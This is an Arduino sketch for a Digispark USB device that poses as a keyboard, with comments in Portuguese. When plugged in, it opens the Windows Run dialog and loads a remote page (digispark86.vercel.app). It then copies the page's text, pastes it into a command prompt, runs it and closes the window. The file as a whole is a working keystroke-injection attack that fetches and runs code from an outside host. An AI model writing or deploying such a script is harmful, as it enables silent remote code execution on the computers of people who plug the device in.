#include "DigiKeyboard.h"

void doisPontos() {
  DigiKeyboard.sendKeyStroke(56, MOD_SHIFT_LEFT);
}

void barra() {
  DigiKeyboard.sendKeyStroke(
    KEY_Q,
    MOD_CONTROL_LEFT | MOD_ALT_LEFT
  );
}

void setup() {
}

void loop() {

  DigiKeyboard.sendKeyStroke(0);

  // Abre Executar
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Digita a URL
  DigiKeyboard.print("https");
  doisPontos();
  barra();
  barra();
  DigiKeyboard.print("digispark86.vercel.app");
  barra();

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Espera o site carregar
  DigiKeyboard.delay(2000);

  // Seleciona tudo e copia
  DigiKeyboard.sendKeyStroke(KEY_A, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);

  // Fecha a aba
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);

  // Abre Executar novamente
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Abre CMD
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Espera o CMD abrir
  DigiKeyboard.delay(600);

  // Cola
  DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);

  // Para aqui — executa com ENTER

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
 
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);

  while (true) {
    DigiKeyboard.delay(1000);
  }
}
